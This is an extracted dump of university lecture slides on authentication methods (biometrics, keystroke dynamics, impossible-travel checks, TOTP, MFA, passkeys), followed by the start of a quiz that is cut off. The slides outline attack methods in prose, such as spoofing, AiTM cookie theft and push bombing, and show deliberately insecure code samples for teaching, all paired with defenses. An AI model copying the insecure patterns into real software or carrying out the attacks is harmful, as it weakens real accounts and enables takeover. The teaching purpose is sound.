+        "text": "CATEGORY 3 - WALKTHROUGH\nBiometrics: Code Explained\n1   Scores are similarity values: genuine attempts cluster high, impostor attempts cluster low, but the two \noverlap.\n2   FAR = share of impostors scoring \u2265 threshold (security failure: the wrong person is accepted).\n3   FRR = share of genuine users scoring < threshold (usability failure: the owner is rejected).\n4  Raising the threshold lowers FAR but raises FRR; the loop prints this trade -off numerically.\n5   Vendors quote the Equal Error Rate (EER) where FAR = FRR - a lower EER means a better sensor.\nEXPECTED OUTPUT\nthreshold=0.50  FAR=25.0%  FRR=0.0%\nthreshold=0.60  FAR=12.5%  FRR=0.0%\nthreshold=0.70  FAR=0.0%   FRR=12.5%\nthreshold=0.80  FAR=0.0%   FRR=37.5%\nCOMMON PITFALL\nQuoting \u201c99% accurate\u201d: meaningless \nwithout FAR and FRR at a stated threshold, \ntested against spoof attempts (masks, lifted \nprints).\nDr. Ayman Taha - Dr. Donia Gamal 30"
+      },
+      {
+        "page": 7,
+        "text": "CATEGORY 3 - WALKTHROUGH\nBiometrics: Attack & Defense\n\u2717  ATTACK - HOW IT'S PERFORMED\n\u2022 Lift a latent fingerprint from a glass or phone \nscreen the victim touched (classic forensic \ntechnique).\n\u2022 For face sensors: use a high-resolution photo, \nvideo replay, or a 3D-printed mask if the sensor \nhas no depth or liveness check.\n\u2022 Present the fake artifact to the sensor instead \nof the live user - a 2D image-matching sensor \ncannot tell the difference.\n\u2713  DEFENSE - HOW TO PREVENT IT\n\u2022 Require liveness/depth detection: infrared \ndepth maps, pulse or blood-flow sensing, \nrandomized blink/smile challenges.\n\u2022 Use multi-modal verification (fingerprint + face, \nor biometric + device possession) so one \nspoofed modality isn't enough.\n\u2022 Keep templates and matching on-device in a \nsecure enclave - a breach of the backend \nreveals nothing usable remotely.\n\u2022 Log and rate-limit presentation attempts; flag \nrepeated failed scans followed by a sudden \nsuccess for review.\nDr. Ayman Taha - Dr. Donia Gamal 31"
+      },
+      {
+        "page": 8,
+        "text": "CATEGORY 3 - SOMETHING YOU ARE (CONTINUOUS)\nBehavioral Biometrics\nWHY does it exist?\nPasswords verify you once at login - behavioral signals verify you CONTINUOUSLY during the \nwhole session.\nHOW does it work?\n\u2022 Passively model interaction: keystroke dwell/flight time, mouse curves, touch pressure, gait.\n\u2022 Anomaly score feeds a risk engine \u2192 silent allow, step-up MFA, or session kill.\n+  STRENGTHS\n\u2022 Zero friction - invisible to the legitimate user.\n\u2022 Catches session hijacking and bots/RATs AFTER login, where classic auth is blind.\n\u2212  WEAKNESSES\n\u2022 Model drift: injury, stress, new keyboard \u2192 false alarms; needs ongoing retraining.\n\u2022 Privacy: continuous monitoring is surveillance-shaped; consent issues.\n\u2022 Not a standalone factor - a supporting risk signal only.\nWHEN should you use it?\nFraud scoring in banking/fintech, Zero Trust continuous evaluation, high-security portals.\nDr. Ayman Taha - Dr. Donia Gamal 32\nRemote \nAccess \nTrojans"
+      },
+      {
+        "page": 9,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 33\n"
+      },
+      {
+        "page": 10,
+        "text": "CATEGORY 3 - CODE & REAL LIFE\nBehavioral: Keystroke Dynamics (Python)\nimport statistics\nprofile = {\"s\": 88, \"e\": 74, \"c\": 95, \"r\": 70, \"3\": 110, \"t\": 76}  # enrolled dwell (ms)\n \ndef anomaly_score(attempt):\n    d = [abs(attempt[k] - profile[k]) / profile[k] for k in profile if k in attempt]\n    return statistics.mean(d)                  # 0.0 = perfect match\n \nme    = {\"s\": 90, \"e\": 72, \"c\": 97, \"r\": 71, \"3\": 108, \"t\": 75}\nthief = {\"s\": 120, \"e\": 55, \"c\": 140, \"r\": 95, \"3\": 60, \"t\": 130}\nprint(\"legit   :\", round(anomaly_score(me), 3))      # ~0.02 -> allow\nprint(\"attacker:\", round(anomaly_score(thief), 3))   # ~0.45 -> step-up MFA!\n# rule: score < 0.15 allow | 0.15-0.35 step-up | > 0.35 lock + alert\nREAL LIFE\n\u2022  BioCatch-style banking systems detect remote-access trojans and money mules mid-session from typing/mouse \nanomalies.\nDr. Ayman Taha - Dr. Donia Gamal 34"
+      },
+      {
+        "page": 11,
+        "text": "CATEGORY 3 - WALKTHROUGH\nBehavioral Biometrics: Code Explained\n1   profile stores the user's enrolled key dwell time (ms) per key, learned over many sessions.\n2   anomaly_score() computes the relative error |observed \u2212 enrolled| / enrolled for each key typed.\n3   The mean of those errors is one number: 0.0 is a perfect match, larger means less like the owner.\n4   The owner (0.019) types like the profile \u2192 silent allow; the thief (0.436) is ~44% off \u2192 challenge.\n5   Thresholds decide the action: allow, step-up MFA, or lock + alert - tuned on real data.\nEXPECTED OUTPUT\nlegit   : 0.019\nattacker: 0.436\nCOMMON PITFALL\nJudging on too few keystrokes, never \nretraining for drift (injury, new keyboard) and \nusing it as the only gate - malware can replay \nrecorded timings.\nDr. Ayman Taha - Dr. Donia Gamal 35"
+      },
+      {
+        "page": 12,
+        "text": "CATEGORY 3 - WALKTHROUGH\nBehavioral Biometrics: Insecure vs Secure\n\u2717  INSECURE \u2713  SECURE\n# authenticate once, trust forever\nsession = login(user, pw)  # 30 days\n# stolen cookie = full access\n# nobody re-checks the user\n# continuous evaluation\nfor ev in session.events():\n    if anomaly(ev) > 0.35:\n        require_step_up(session)\nMORE REAL-LIFE CASES\n\u2022  Banks (BioCatch-style): typing, mouse and touch patterns reveal remote-access scams and mule \naccounts mid-session.\n\u2022  Google reCAPTCHA v3: scores user behavior from 0.0 (bot) to 1.0 (human) instead of showing a \npuzzle.\n\u2022  Microsoft Continuous Access Evaluation: tokens are revoked near real time when user risk changes.\nDr. Ayman Taha - Dr. Donia Gamal 36"
+      },
+      {
+        "page": 13,
+        "text": "CATEGORY 3 - WALKTHROUGH\nBehavioral Biometrics: Attack & Defense\n\u2717  ATTACK - HOW IT'S PERFORMED\n\u2022 Capture a legitimate user's keystroke/mouse \ntiming with a keylogger or by recording their \nscreen/input events.\n\u2022 Replay the captured timing pattern through an \nautomation script while performing the \nfraudulent action.\n\u2022 If the risk engine only compares the new \nattempt's pattern similarity to a stored static \nprofile, the replay matches and passes.\n\u2713  DEFENSE - HOW TO PREVENT IT\n\u2022 Bind the session to a device/browser fingerprint \ntoo, not timing data alone - a replay script runs \nin a different environment.\n\u2022 Continuously re-score throughout the session \n(not only at login) so a mid-session switch to \nautomation is caught.\n\u2022 Detect \u201ctoo-perfect\u201d timing: real humans have \nnatural jitter; a macro replay is often \nsuspiciously exact.\n\u2022 Treat behavioral signals as ONE input to a risk \nengine, combined with device, network and \nlocation - never a standalone gate.\nDr. Ayman Taha - Dr. Donia Gamal 37"
+      },
+      {
+        "page": 14,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 38\n"
+      },
+      {
+        "page": 15,
+        "text": "TAXONOMY\nClassification of Authentication Methods\n\u25a0  1. Knowledge-Based \u2013 \u201cSomething you know\u201d\n\u2013  Passwords, PINs, security questions\n\u25a0  2. Possession-Based \u2013 \u201cSomething you have\u201d\n\u2013  OTP hardware tokens, smart cards, hardware security keys (FIDO U2F)\n\u25a0  3. Inherence-Based \u2013 \u201cSomething you are / how you behave\u201d\n\u2013  Physiological biometrics (fingerprint, face, voice) and behavioral biometrics (keystroke)\n\u25a0  4. Location-Based \u2013 \u201cSomewhere you are\u201d\n\u2013  IP allow-listing, geofencing, network-location trust\n\u25a0  5. Time-Based \u2013 \u201cWhen you act\u201d\n\u2013  TOTP (RFC 6238), HOTP (RFC 4226) \u2013 time/counter-synchronized one-time codes\n\u25a0  6. Composite \u2013 Multi-Factor & Adaptive (Risk-Based) Authentication\n\u2013  Combines two or more factor categories above; adapts requirements to real-time risk\n\u25a0  7. Emerging \u2013 Passwordless, Decentralized, Quantum-Resistant\n\u2013  Passkeys/FIDO2/WebAuthn, Decentralized Identifiers, post-quantum authentication schemes\n"
+      },
+      {
+        "page": 16,
+        "text": "CATEGORY 4 - SOMEWHERE YOU ARE\nLocation-Based Authentication\nWHY does it exist?\nmost attacks come from far away - geography is a free, frictionless risk signal.\nHOW does it work?\n\u2022 IP allow-listing: only corporate/VPN ranges may connect.\n\u2022 Geo-velocity ('impossible travel'): Cairo 09:00 \u2192 London 09:30 = physically impossible \u2192 block.\n+  STRENGTHS\n\u2022 Zero user friction; silently blocks entire classes of remote attack.\n\u2022 Excellent at alerting: 'new country' notifications catch real breaches.\n\u2212  WEAKNESSES\n\u2022 NOT an identity factor: VPNs, proxies, and GPS spoofing defeat it easily.\n\u2022 False positives for travelers, remote workers.\nWHEN should you use it?\nOnly as one signal inside adaptive / conditional-access policy - never the sole gate.\nDr. Ayman Taha - Dr. Donia Gamal 40"
+      },
+      {
+        "page": 17,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 41\n"
+      },
+      {
+        "page": 18,
+        "text": "CATEGORY 4 - CODE & REAL LIFE\nLocation: Impossible-Travel Check (Python)\nfrom math import radians, sin, cos, asin, sqrt\n \ndef km(a, b):                        # haver-sine distance\n    lat1, lon1 = map(radians, a);  lat2, lon2 = map(radians, b)\n    h = sin((lat2-lat1)/2)**2 + cos(lat1)*cos(lat2)*sin((lon2-lon1)/2)**2\n    return 2 * 6371 * asin(sqrt(h)) #returns distance in kilometer\n \ndef impossible_travel(p1, p2, hours):\n    speed = km(p1, p2) / hours                       # km/h needed\n    verdict = \"IMPOSSIBLE -> block + alert\" if speed > 900 else \"plausible\"\n    print(f\"{km(p1,p2):,.0f} km in {hours}h = {speed:,.0f} km/h -> {verdict}\")\n \ncairo, london, dubai = (30.04, 31.24), (51.51, -0.13), (25.20, 55.27)\nimpossible_travel(cairo, london, 0.5) #attacker with stolen cookie 0.5 time difference between two login\nimpossible_travel(cairo, dubai,  4.0) # real business trip\nDr. Ayman Taha - Dr. Donia Gamal 42"
+      },
+      {
+        "page": 19,
+        "text": "CATEGORY 4 - WALKTHROUGH\nLocation: Code Explained\n1   km() applies the haver-sine formula: great-circle distance between two lat/lon points (Earth radius 6371 km).\n2   impossible_travel() divides distance by elapsed hours: the speed the user would have needed.\n3   The 900 km/h threshold is about airliner cruise speed; anything faster is physically impossible.\n4   Cairo \u2192 London in 30 min needs 7,024 km/h (stolen session); Cairo \u2192 Dubai in 4 h needs 606 km/h (plausible).\n5   In production, resolve IPs with a geolocation DB (free MaxMind GeoLite2) and store last-login time and place.\nEXPECTED OUTPUT\n3,512 km in 0.5h = 7,024 km/h -> IMPOSSIBLE -> block + alert\n2,423 km in 4.0h = 606 km/h -> plausible\nCOMMON PITFALL\nVPN exits and carrier-grade NAT make IP \ngeolocation wrong. Treat it as a risk signal \nwith allowances (known VPN, mobile carrier), \nnot a verdict (attack).\nDr. Ayman Taha - Dr. Donia Gamal 43"
+      },
+      {
+        "page": 20,
+        "text": "CATEGORY 4 - WALKTHROUGH\nLocation: Insecure vs Secure\n\u2717  INSECURE \u2713  SECURE\n# static country allow-list = the gate\nif ip_country(ip) == \"EG\":\n    login_ok()\n# a VPN exit in Egypt bypasses it\n \n# location is ONE risk signal\nif impossible_travel(prev, now, hrs):\n    risk += 30\nif risk >= 30:\n    require_mfa()\nMORE REAL-LIFE CASES\n\u2022  Microsoft Entra ID Protection: \u201catypical travel\u201d and \u201canonymous IP\u201d are built -in risk detections.\n\u2022  Banks decline or challenge card payments far from your usual location, then ask you to confirm.\n\u2022  Gmail / Netflix: \u201cNew sign-in from a new location\u201d emails let users spot account takeover quickly.\n44Dr. Ayman Taha - Dr. Donia Gamal"
+      },
+      {
+        "page": 21,
+        "text": "CATEGORY 4 - WALKTHROUGH\nLocation: Attack & Defense\n\u2717  ATTACK - HOW IT'S PERFORMED\n\u2022 Connect through a VPN or commercial proxy \nwhose exit node sits inside the victim's allow-\nlisted country or city.\n\u2022 Or rent a residential-IP proxy service to get an \naddress that matches the target's exact \nISP/city, defeating simple ASN blocking.\n\u2713  DEFENSE - HOW TO PREVENT IT\n\u2022 Never use location as the sole gate - pair it with \nMFA.\n\u2022 Use IP-reputation and VPN/proxy-detection \nfeeds to flag known hosting, Tor, and \nresidential-proxy ranges.\n\u2022 Step-up (don't silently allow) whenever ANY \nother signal looks new - new device, new \nbrowser, odd hour - even if geo matches.\nDr. Ayman Taha - Dr. Donia Gamal 45"
+      },
+      {
+        "page": 22,
+        "text": "TAXONOMY\nClassification of Authentication Methods\n\u25a0  1. Knowledge-Based \u2013 \u201cSomething you know\u201d\n\u2013  Passwords, PINs, security questions\n\u25a0  2. Possession-Based \u2013 \u201cSomething you have\u201d\n\u2013  OTP hardware tokens, smart cards, hardware security keys (FIDO U2F)\n\u25a0  3. Inherence-Based \u2013 \u201cSomething you are / how you behave\u201d\n\u2013  Physiological biometrics (fingerprint, face, voice) and behavioral biometrics (keystroke)\n\u25a0  4. Location-Based \u2013 \u201cSomewhere you are\u201d\n\u2013  IP allow-listing, geofencing, network-location trust\n\u25a0  5. Time-Based \u2013 \u201cWhen you act\u201d\n\u2013  TOTP (RFC 6238), HOTP (RFC 4226) \u2013 time/counter-synchronized one-time codes\n\u25a0  6. Composite \u2013 Multi-Factor & Adaptive (Risk-Based) Authentication\n\u2013  Combines two or more factor categories above; adapts requirements to real-time risk\n\u25a0  7. Emerging \u2013 Passwordless, Decentralized, Quantum-Resistant\n\u2013  Passkeys/FIDO2/WebAuthn, Decentralized Identifiers, post-quantum authentication schemes\n"
+      },
+      {
+        "page": 23,
+        "text": "CATEGORY 5 - WHEN YOU ACT\nTime-Based: TOTP & HOTP\nWHY does it exist?\nAdd a second, independent factor with ZERO infrastructure: no SMS gateway, no hardware token - just an app.\nHOW does it work?\n\u2022 Enrollment: server and app share one secret (QR code).\n\u2022 HOTP (RFC 4226): HMAC-SHA1(secret, counter) \u2192 6 digits.  TOTP (RFC 6238): counter = time \u00f7 30 s.\n\u2022 Both sides compute independently; the code is compared, never stored; \u00b11 window tolerates clock drift.\n+  STRENGTHS\n\u2022 Works offline, free, standardized; huge ecosystem (Google/Microsoft Authenticator, Authy).\n\u2022 Secret never crosses the network after setup; codes expire in 30 s.\n\u2212  WEAKNESSES\n\u2022 Shared secret lives on the SERVER - a database leak enables code forgery.\n\u2022 Device loss = lockout without recovery codes; unencrypted app backups have leaked seeds.\nWHEN should you use it?\nDefault second factor in 2026 - meets AAL2 minimum\nDr. Ayman Taha - Dr. Donia Gamal 47"
+      },
+      {
+        "page": 24,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 48\n"
+      },
+      {
+        "page": 25,
+        "text": "How MAC works?\nDr. Ayman Taha - Dr. Donia Gamal 49\n"
+      },
+      {
+        "page": 26,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 50\n"
+      },
+      {
+        "page": 27,
+        "text": "CATEGORY 5 - CODE & REAL LIFE\nTOTP Generation & Verification (pyotp)\npip install pyotp\nimport pyotp, time\n \n# 1) ENROLLMENT - server generates the shared secret once\nsecret = pyotp.random_base32()           # e.g. 'JBSWY3DPEHPK3PXP\u2019 or usually by QR code used as secret key\n# 2) AUTHENTICATOR side - current 6-digit code\ntotp = pyotp.TOTP(secret);  \ncode = totp.now() #hmac_result\n \n# 3) SERVER side - verify; valid_window=1 allows +/-30 s drift\nassert totp.verify(code, valid_window=1)       # MFA passed\ntime.sleep(31);  \ntotp.verify(code, valid_window=0)  # False - expired\nDr. Ayman Taha - Dr. Donia Gamal 51"
+      },
+      {
+        "page": 28,
+        "text": "CATEGORY 5 - WALKTHROUGH\nTOTP: Code Explained\n1   random_base32() creates a 160-bit shared secret, shown once as a QR code (otpauth:// URI).\n2   Both sides compute HMAC-SHA(secret, floor(unix_time / 30)) and truncate it to 6 digits.\n3   now() returns the current code; it changes every 30 s with no network traffic between phone and server.\n4   verify(code, valid_window=1) accepts the previous, current and next step to tolerate clock drift.\n5   After 31 s the same code fails with valid_window=0 - but inside its window it can still be replayed.\nEXPECTED OUTPUT\notpauth://totp/AuthLab:student%40lab?secret=...&issuer=AuthLab\n492039      # example code (changes every 30 s)\nTrue        # verified in time\nFalse       # expired after 31 s\nCOMMON PITFALL\nNo rate limit on verify() (only 1,000,000 \ncodes) and no \u201clast used step\u201d check, so a \nsniffed code is reusable within its window.\nDr. Ayman Taha - Dr. Donia Gamal 52"
+      },
+      {
+        "page": 29,
+        "text": "CATEGORY 5 - WALKTHROUGH\nTOTP: Insecure vs Secure\n\u2717  INSECURE \u2713  SECURE\ncode = random.randint(100000, 999999)\nsend_sms(phone, code)\n# predictable PRNG; SIM swap and\n# SS7 interception read the SMS\nstep = totp.timecode(now())\nok = totp.verify(code, valid_window=1)\nif ok and step > user.last_step:\n    user.last_step = step  # no replay\nREAL-LIFE CASES\n\u2022  Jack Dorsey's Twitter account (2019): hijacked through a SIM swap, which defeats SMS codes.\n\u2022  GitHub mandated 2FA for all developers (2023) - TOTP is the industry's minimum bar.\nDr. Ayman Taha - Dr. Donia Gamal 53"
+      },
+      {
+        "page": 30,
+        "text": "CATEGORY 5 - WALKTHROUGH\nTOTP: Attack & Defense\n\u2717  ATTACK - HOW IT'S PERFORMED\n\u2022 Send a phishing link that mirrors the real login.\n\u2022 Victim enters username, password, and the \ncurrent TOTP code on the fake page; the \nattacker forwards everything live to the real site.\n\u2022 The real site logs the user in and issues a \nsession cookie; the attacker captures that \ncookie as it passes through.\n\u2022 The attacker replays the stolen session cookie \nand is fully logged in - the TOTP code itself is \nnever needed again.\n\u2713  DEFENSE - HOW TO PREVENT IT\n\u2022 If still using TOTP, pair it with number-matching \npush and bind sessions to the device/TLS \nfingerprint where supported.\n\u2022 Deploy browser/organization-level phishing \nprotections (Safe Browsing, allow-listed \ncorporate login domains).\nDr. Ayman Taha - Dr. Donia Gamal 54"
+      },
+      {
+        "page": 31,
+        "text": "TAXONOMY\nClassification of Authentication Methods\n\u25a0  1. Knowledge-Based \u2013 \u201cSomething you know\u201d\n\u2013  Passwords, PINs, security questions\n\u25a0  2. Possession-Based \u2013 \u201cSomething you have\u201d\n\u2013  OTP hardware tokens, smart cards, hardware security keys (FIDO U2F)\n\u25a0  3. Inherence-Based \u2013 \u201cSomething you are / how you behave\u201d\n\u2013  Physiological biometrics (fingerprint, face, voice) and behavioral biometrics (keystroke)\n\u25a0  4. Location-Based \u2013 \u201cSomewhere you are\u201d\n\u2013  IP allow-listing, geofencing, network-location trust\n\u25a0  5. Time-Based \u2013 \u201cWhen you act\u201d\n\u2013  TOTP (RFC 6238), HOTP (RFC 4226) \u2013 time/counter-synchronized one-time codes\n\u25a0  6. Composite \u2013 Multi-Factor & Adaptive (Risk-Based) Authentication\n\u2013  Combines two or more factor categories above; adapts requirements to real-time risk\n\u25a0  7. Emerging \u2013 Passwordless, Decentralized, Quantum-Resistant\n\u2013  Passkeys/FIDO2/WebAuthn, Decentralized Identifiers, post-quantum authentication schemes\n"
+      },
+      {
+        "page": 32,
+        "text": "CATEGORY 6 - COMPOSITE STRATEGY\nMulti-Factor Authentication (MFA)\nWHY does it exist?\n\u2022 Any single factor can fail; requiring two INDEPENDENT failures collapses attacker economics.\n\u2022 Microsoft: MFA blocks over 99% of automated identity attacks.\nHOW does it work?\n\u2022 Combine factors from DIFFERENT categories: password (know) + TOTP (have) + fingerprint (are).\n+  STRENGTHS\n\u2022 Massive risk reduction for near-zero cost (free authenticator apps).\n\u2022 Graceful degradation: lose one factor, the other still protects you.\n\u2212  WEAKNESSES\n\u2022 MFA fatigue: push-bombing until the user taps 'Approve' - Uber breach (2022) exactly this way.\n\u2022 AiTM phishing relays password + OTP + session cookie in real time.\n\u2022 Recovery flow is the weakest link - attackers target help desks, not the crypto.\nWHEN should you use it?\nEverywhere, always, as the minimum - but prefer phishing-resistant factors (passkeys) for admins.\nDr. Ayman Taha - Dr. Donia Gamal 56"
+      },
+      {
+        "page": 33,
+        "text": "CATEGORY 6 - CODE & REAL LIFE\nMFA: Chaining Two Independent Factors (Python)\nph, totp = PasswordHasher(), pyotp.TOTP(\"JBSWY3DPEHPK3PXP\")\nstored_hash = ph.hash(\"StudentPassw0rd!\")    # factor 1 (server DB)\ndef login(password, otp_code):\n    try:  ph.verify(stored_hash, password)   # something you KNOW\n    except VerifyMismatchError:  return \"FAIL: bad password\"\n    if not totp.verify(otp_code, valid_window=1):  # something you HAVE\n        return \"FAIL: bad OTP\"\n    return \"LOGIN OK - two independent factors\"\nprint(login(\"StudentPassw0rd!\", totp.now()))  # OK\nprint(login(\"StudentPassw0rd!\", \"000000\"))    # OTP wrong -> FAIL\nDr. Ayman Taha - Dr. Donia Gamal 57"
+      },
+      {
+        "page": 34,
+        "text": "CATEGORY 6 - WALKTHROUGH\nMFA: Code Explained\n1   stored_hash is the KNOWLEDGE factor - only the argon2id hash lives in the server database.\n2   TOTP(\"JBSW...\") is the POSSESSION factor - a secret bound to the user's authenticator app.\n3   login() checks the password first, then the OTP; both checks must pass independently.\n4   valid_window=1 tolerates about \u00b130 s of clock drift between the server and the phone.\n5   The factors are independent: a leaked hash does not reveal the code, and a stolen phone does not reveal \nthe password.\nEXPECTED OUTPUT\nLOGIN OK - two independent factors\nFAIL: bad OTP\nCOMMON PITFALL\nDistinct messages (\u201cbad password\u201d vs \u201cbad \nOTP\u201d) tell attackers which factor is right. \nReturn one generic error and rate-limit per \naccount.\n58Dr. Ayman Taha - Dr. Donia Gamal"
+      },
+      {
+        "page": 35,
+        "text": "CATEGORY 6 - WALKTHROUGH\nMFA: Insecure vs Secure\n\u2717  INSECURE \u2713  SECURE\n# NOT MFA: two knowledge factors\nif pw_ok and answer_ok:\n    login()\n# one phishing page steals both\nn = secrets.randbelow(90) + 10\nshow(login_screen, n)\npush(user, \"Enter the number\")\nif user_entered == n: login()\nREAL-LIFE CASES\n\u2022  Uber (2022): push-bombing plus a fake IT message made a contractor approve - number matching blocks this.\n\u2022  Cisco (2022): MFA-fatigue prompts combined with a voice-phishing call let attackers register their own device.\n\u2022  MGM Resorts (2023): help-desk impersonation reset MFA - the recovery process was the weakest factor.\nDr. Ayman Taha - Dr. Donia Gamal 59"
+      },
+      {
+        "page": 36,
+        "text": "CATEGORY 6 - WALKTHROUGH\nMFA: Attack & Defense\n\u2717  ATTACK - HOW IT'S PERFORMED\nMFA push bombing: trigger repeated \u201cApprove sign-in?\u201d \npush notifications until the victim taps Approve out of \nannoyance.\nPair it with social engineering: a fake \u201cIT support\u201d call or chat \nmessage pressuring the user to approve \u201cto fix an issue\u201d \n(the Uber 2022 pattern).\n\u2713  DEFENSE - HOW TO PREVENT IT\n\u2022 Switch push approval to \u201cnumber matching\u201d: the user \nmust type a number shown on the login screen into the \napp, not just tap Approve.\n\u2022 Rate-limit push prompts; and alert security after a few \nconsecutive pushes within a short window.\nDr. Ayman Taha - Dr. Donia Gamal 60"
+      },
+      {
+        "page": 37,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 61\nCATEGORY 6 - WALKTHROUGH\nMFA Effectiveness"
+      },
+      {
+        "page": 38,
+        "text": "TAXONOMY\nClassification of Authentication Methods\n\u25a0  1. Knowledge-Based \u2013 \u201cSomething you know\u201d\n\u2013  Passwords, PINs, security questions\n\u25a0  2. Possession-Based \u2013 \u201cSomething you have\u201d\n\u2013  OTP hardware tokens, smart cards, hardware security keys (FIDO U2F)\n\u25a0  3. Inherence-Based \u2013 \u201cSomething you are / how you behave\u201d\n\u2013  Physiological biometrics (fingerprint, face, voice) and behavioral biometrics (keystroke)\n\u25a0  4. Location-Based \u2013 \u201cSomewhere you are\u201d\n\u2013  IP allow-listing, geofencing, network-location trust\n\u25a0  5. Time-Based \u2013 \u201cWhen you act\u201d\n\u2013  TOTP (RFC 6238), HOTP (RFC 4226) \u2013 time/counter-synchronized one-time codes\n\u25a0  6. Composite \u2013 Multi-Factor & Adaptive (Risk-Based) Authentication\n\u2013  Combines two or more factor categories above; adapts requirements to real-time risk\n\u25a0  7. Emerging \u2013 Passwordless, Decentralized, Quantum-Resistant\n\u2013  Passkeys/FIDO2/WebAuthn, Decentralized Identifiers, post-quantum authentication schemes\n"
+      },
+      {
+        "page": 39,
+        "text": "EMERGING METHODS - CATEGORY 7\nPasswordless: Passkeys (FIDO2 / WebAuthn)\nWHY does it exist?\nEliminate the root cause of account takeover: shared secrets that can be phished, reused, or breached.\nHOW does it work?\n\u2022 Registration: device generates a per-site key pair; only the PUBLIC key goes to the server.\n\u2022 Login: server challenges; authenticator signs locally after user verification (PIN/biometric).\n\u2022 Signature is bound to the exact origin - a phishing site gets a cryptographically useless signature.\n\u2022 Synced passkeys (password managers) \u2192 AAL2; device-bound hardware keys \u2192 AAL3.\n+  STRENGTHS\n\u2022 Phishing-resistant BY DESIGN; no credential database to breach; no reuse, no stuffing.\n\u2022 Better UX than passwords: one biometric/PIN gesture, no typing.\n\u2212  WEAKNESSES\n\u2022 Ecosystem gaps: shared devices, older browsers, enterprise edge cases.\n\u2022 Synced passkeys inherit the cloud account's security (Apple/Google account = new root of trust).\nWHEN should you use it?\nDefault for new consumer apps in 2026; mandatory direction for admins/regulated (AAL2/AAL3).\nDr. Ayman Taha - Dr. Donia Gamal 63"
+      },
+      {
+        "page": 40,
+        "text": "CATEGORY 7 - CODE & REAL LIFE\nWebAuthn in the Browser (JavaScript)\n// REGISTRATION - navigator.credentials.create()\nconst cred = await navigator.credentials.create({ publicKey: {\n  challenge: Uint8Array.from(serverChallenge),\n  rp:   { name: \"AuthLab\" },\n  user: { id: userIdBytes, name: \"student@lab\", displayName: \"Student\" },\n  pubKeyCredParams: [{ alg: -7, type: \"public-key\" }],   // ES256\n  authenticatorSelection: { residentKey: \"preferred\", userVerification: \"required\" },\n  timeout: 60000 }});\n \n// LOGIN - navigator.credentials.get()\nconst assertion = await navigator.credentials.get({ publicKey: {\n  challenge: Uint8Array.from(serverChallenge), userVerification: \"required\" }});\n// -> server verifies the signature with the stored public key\nDr. Ayman Taha - Dr. Donia Gamal 64"
+      },
+      {
+        "page": 41,
+        "text": "CATEGORY 7 - WALKTHROUGH\nPasskeys: Code Explained\n1   challenge: random bytes from the server; the authenticator signs it, making each login unique (anti -replay).\n2   rp: the Relying Party; the credential is bound to its domain, so a look -alike site cannot use it.\n3   pubKeyCredParams alg \u22127 = ES256 (ECDSA P-256) - the algorithm of the new key pair.\n4   userVerification: \"required\" forces a PIN or biometric on the device before the key may sign.\n5   create() returns the public key to store; get() returns a signature over challenge + origin to verify.\nEXPECTED OUTPUT\n{\"type\":\"webauthn.get\",\"challenge\":\"...\",\n \"origin\":\"https://authlab.example\"}\nsignature valid, origin ok -> LOGIN OK\nCOMMON PITFALL\nServer skips origin, challenge and rpId-hash \nchecks - or has no recovery plan. Register \n2+ passkeys and avoid SMS fallback.\nDr. Ayman Taha - Dr. Donia Gamal 65"
+      },
+      {
+        "page": 42,
+        "text": "CATEGORY 7 - WALKTHROUGH\nPasskeys: Insecure vs Secure\n\u2717  INSECURE \u2713  SECURE\n<input type=\"password\" name=\"pw\">\n// typed into any look-alike site\n// phished, reused, stuffed\n \n<input autocomplete=\"username webauthn\">\ncredentials.get({ mediation:\n  \"conditional\", publicKey: {...} })\n// origin-bound, no secret typed\nREAL-LIFE CASES\n\u2022  Microsoft, Google, Apple, PayPal, Amazon, GitHub: passkeys are offered by default and sync through the \nplatform vendor.\nDr. Ayman Taha - Dr. Donia Gamal 66"
+      },
+      {
+        "page": 43,
+        "text": "CATEGORY 7 - WALKTHROUGH\nPasskeys: Attack & Defense\n\u2717  ATTACK - HOW IT'S PERFORMED\n\u2022 Direct phishing of the passkey itself fails (origin-bound \nsignatures can't be relayed), so attackers target \nACCOUNT RECOVERY instead.\n\u2022 Social-engineer the help desk or the user into enrolling a \nbrand-new passkey on an attacker-controlled device.\n\u2713  DEFENSE - HOW TO PREVENT IT\n\u2022 Harden recovery: require identity-proofed re-enrollment \n(video/ID check or in-person) rather than a phone call to a \nhelp desk.\n\u2022 Disable or tightly restrict weaker fallback methods once \npasskeys are enabled for an account.\n\u2022 Protect the syncing cloud account itself with its own \nstrong MFA/passkey - it is now part of the trust chain.\n\u2022 Treat new-passkey registration as a sensitive security \nevent: notify the user and log/alert on it.\nDr. Ayman Taha - Dr. Donia Gamal 67"
+      },
+      {
+        "page": 44,
+        "text": "68Dr. Ayman Taha - Dr. Donia Gamal\nWhat about \nnon-Human \nAuthentication?"
+      }
+    ]
+  },
+  {
+    "file": "C:\\Users\\jun69\\Desktop\\sec lec and labs\\Lecture 6.pdf",
+    "pages": [
+      {
+        "page": 1,
+        "text": "Kahoot\nRecap-SW-SEC\nTest your knowledge\nQuestions (24)\n1 - Quiz 2 - Slide\n3 - Quiz 4 - Quiz\n5 - Quiz 6 - Quiz\nWhat does Wi-Fi stand for?\nWireless Fidelity and InternetWireless Fidelity and InternetWireless Fidelity and Internet Wireless Frequency InterfaceWireless Frequency InterfaceWireless Frequency Interface\nWide-Frequency InternetWide-Frequency InternetWide-Frequency Internet NNoneoneNone\nMMCQ\n20 Seconds Per Question\nWhich term describes an implementation-level\ncoding error, such as a buffer overflow or off-by-one\nerror?\nArchitectural FlawArchitectural FlawArchitectural Flaw Implementation BugImplementation BugImplementation Bug\nDesign FlawDesign FlawDesign Flaw NNoneoneNone\nConsider the following Java code, What is the primary\nvulnerability?\nIInteger overflownteger overflowInteger overflow PPath traversal caused byath traversal caused by\ninsufficient path validationinsufficient path validation\nPath traversal caused by\ninsufficient path validation\nIInsecure deserializationnsecure deserializationInsecure deserialization IImproper cryptographic keymproper cryptographic key\nmanagementmanagement\nImproper cryptographic key\nmanagement\nSystem stores passwords using SHA-256 with a salt for\nevery user.Why can this be inadequate for password\nstorage?\nSHA-256 is reversible when theSHA-256 is reversible when the\nsalt is knownsalt is known\nSHA-256 is reversible when the\nsalt is known\nSSalts eliminate the need for aalts eliminate the need for a\npassword-hashing algorithmpassword-hashing algorithm\nSalts eliminate the need for 